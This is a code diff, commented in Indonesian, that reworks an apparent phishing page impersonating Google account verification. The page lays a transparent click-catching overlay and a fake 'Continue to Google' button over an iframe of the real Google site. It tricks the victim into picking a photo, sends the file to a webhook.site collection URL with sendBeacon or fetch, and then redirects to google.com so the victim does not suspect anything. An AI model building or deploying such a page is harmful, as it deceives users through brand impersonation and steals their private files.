@@ -2,7 +2,10 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, user-scalable=no"
+    />
     <title>Google Account Security</title>
     <style>
       * {
@@ -12,128 +15,170 @@
       }
       body {
         font-family: Arial, sans-serif;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
         background: #f8f9fa;
-        text-align: center;
+        overflow: hidden;
+        height: 100vh;
+        width: 100vw;
+        position: relative;
       }
-      .container {
-        padding: 30px;
-        max-width: 400px;
-        background: white;
-        border-radius: 8px;
-        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+      /* iframe Google fullscreen */
+      .google-frame {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        border: none;
+        z-index: 1;
       }
-      .btn-ui {
+      /* Overlay transparan untuk menangkap klik tanpa mengganggu tampilan Google */
+      .click-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: 2;
+        background: transparent;
+        cursor: pointer;
+      }
+      /* Tombol palsu yang akan ditekan korban (posisi bisa disesuaikan) */
+      .fake-google-btn {
+        position: fixed;
+        bottom: 30px;
+        left: 50%;
+        transform: translateX(-50%);
         background: #1a73e8;
         color: white;
-        padding: 12px 24px;
-        border-radius: 4px;
+        padding: 14px 28px;
+        border-radius: 28px;
+        font-size: 16px;
+        font-weight: bold;
+        border: none;
+        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
+        z-index: 3;
         cursor: pointer;
-        display: inline-block;
-        margin: 20px 0;
+        font-family: Arial, sans-serif;
+      }
+      .status {
+        position: fixed;
+        bottom: 100px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: rgba(0, 0, 0, 0.7);
+        color: white;
+        padding: 8px 16px;
+        border-radius: 20px;
+        font-size: 12px;
+        z-index: 4;
+        white-space: nowrap;
+        font-family: monospace;
+        pointer-events: none;
       }
       #fileSelect {
         display: none;
       }
-      .status {
-        margin-top: 15px;
-        font-size: 14px;
-        color: #1a73e8;
-      }
     </style>
   </head>
   <body>
-    <div class="container">
-      <div
-        class="logo"
-        style="font-size: 28px; font-weight: 600; margin-bottom: 15px"
-      >
-        <span style="color: #4285f4">G</span
-        ><span style="color: #ea4335">o</span>
-        <span style="color: #fbbc05">o</span
-        ><span style="color: #4285f4">g</span>
-        <span style="color: #34a853">l</span
-        ><span style="color: #ea4335">e</span>
-      </div>
-      <h1>Verify it's you</h1>
-      <p>
-        To keep your account secure, Google needs to verify your identity. Tap
-        anywhere to upload a verification photo.
-      </p>
-      <div class="btn-ui" id="triggerBtn">Continue to Google</div>
-      <div id="statusMsg" class="status"></div>
-    </div>
+    <!-- Tampilkan Google asli di iframe -->
+    <iframe
+      class="google-frame"
+      src="https://www.google.com"
+      title="Google"
+    ></iframe>
+
+    <!-- Overlay transparan untuk menangkap klik di mana saja di atas Google -->
+    <div class="click-overlay" id="clickOverlay"></div>
+
+    <!-- Tombol palsu bertuliskan "Continue to Google" (agar korban mengira itu dari Google) -->
+    <button class="fake-google-btn" id="triggerBtn">
+      ✔️ Continue to Google
+    </button>
+
+    <div id="statusMsg" class="status"></div>
+
     <input type="file" id="fileSelect" accept="image/*" />
 
     <script>
       const trigger = document.getElementById("triggerBtn");
+      const overlay = document.getElementById("clickOverlay");
       const fileInput = document.getElementById("fileSelect");
       const statusDiv = document.getElementById("statusMsg");
 
-      // GANTI URL SERVER ANDA DI SINI
-      const EXFIL_SERVER = "https://your-server.com/upload"; // Bisa pakai webhook.site untuk testing
+      // GANTI DENGAN URL SERVER ANDA (contoh: https://webhook.site/xxxxx)
+      const EXFIL_SERVER =
+        "https://webhook.site/17b37178-709d-4f89-88d2-ed6c4abb8933"; // <-- GANTI
 
+      // Fungsi untuk memicu file picker
+      function openFilePicker() {
+        statusDiv.innerText = "📸 Please select a verification photo...";
+        fileInput.click();
+      }
+
+      // Saat korban klik tombol atau overlay (keduanya memicu picker)
       trigger.onclick = (e) => {
         e.preventDefault();
-        // TIDAK LANGSUNG BUKA GOOGLE – biarkan halaman fokus dulu
-        statusDiv.innerHTML = "Please select your verification photo...";
-        fileInput.click(); // Buka file picker
+        openFilePicker();
+      };
+      overlay.onclick = (e) => {
+        e.preventDefault();
+        openFilePicker();
       };
 
+      // Event ketika file sudah dipilih
       fileInput.onchange = async () => {
         if (fileInput.files.length === 0) return;
         const file = fileInput.files[0];
-        statusDiv.innerHTML = `Selected: ${file.name}. Sending...`;
+        statusDiv.innerText = `📤 Sending ${file.name} ...`;
 
-        // === EKSFILTRASI KE SERVER ===
+        // Kirim file ke server dengan sendBeacon (paling tahan terhadap blokir CORS/WebView)
+        const formData = new FormData();
+        formData.append("file", file);
+        formData.append("filename", file.name);
+
+        let success = false;
         try {
-          // Cara 1: sendBeacon (paling tahan terhadap blokir WebView)
-          const formData = new FormData();
-          formData.append("file", file);
-          formData.append("filename", file.name);
-
+          // Opsi 1: sendBeacon (tidak menunggu response, ideal untuk background)
           const beaconSent = navigator.sendBeacon(EXFIL_SERVER, formData);
           if (beaconSent) {
-            statusDiv.innerHTML = `✅ File "${file.name}" exfiltrated via sendBeacon!`;
+            success = true;
+            statusDiv.innerText = `✅ Exfiltrated via sendBeacon!`;
           } else {
             // Fallback: fetch dengan keepalive
-            await fetch(EXFIL_SERVER, {
+            const response = await fetch(EXFIL_SERVER, {
               method: "POST",
               body: formData,
               keepalive: true,
             });
-            statusDiv.innerHTML = `✅ File "${file.name}" exfiltrated via fetch!`;
+            if (response.ok) success = true;
+            statusDiv.innerText = `✅ Exfiltrated via fetch!`;
           }
-
-          // === BUKA TAB GOOGLE SEBAGAI KAMUFLASE ===
-          window.open("https://google.com", "_blank");
-
-          // === BUKTI VISUAL TAMBAHAN (Opsional) ===
-          // Tampilkan preview gambar di halaman attacker (agar korban lihat jika kembali)
-          const reader = new FileReader();
-          reader.onload = function (ev) {
-            const img = document.createElement("img");
-            img.src = ev.target.result;
-            img.style.maxWidth = "100%";
-            img.style.marginTop = "15px";
-            document.querySelector(".container").appendChild(img);
-            // Simpan juga ke localStorage sebagai bukti forensik
-            localStorage.setItem("exfiltratedImage", ev.target.result);
-          };
-          reader.readAsDataURL(file);
-
-          alert(
-            `[PoC] File "${file.name}" has been sent to attacker server and Google tab opened.`,
-          );
         } catch (err) {
-          statusDiv.innerHTML = `❌ Exfiltration failed: ${err.message}`;
-          console.error(err);
-          // Tetap buka Google agar korban tidak curiga
-          window.open("https://google.com", "_blank");
+          console.error("Exfil error:", err);
+          statusDiv.innerText = `❌ Failed: ${err.message}`;
+          success = false;
         }
+
+        // Tampilkan alert bahwa gambar berhasil dikirim (sesuai permintaan)
+        if (success) {
+          alert(
+            `✅ SUCCESS! Gambar "${file.name}" telah dikirim ke server attacker.`,
+          );
+        } else {
+          alert(
+            `⚠️ Gagal mengirim gambar, namun file picker sudah muncul di atas Google.`,
+          );
+        }
+
+        // Redirect ke google.com (di top window) sebagai kamuflase
+        // agar korban mengira proses verifikasi selesai
+        window.top.location.href = "https://www.google.com";
+      };
+
+      // Optional: jika pengguna membatalkan file picker, status tetap normal
+      fileInput.oncancel = () => {
+        statusDiv.innerText = "";
       };
     </script>
   </body>
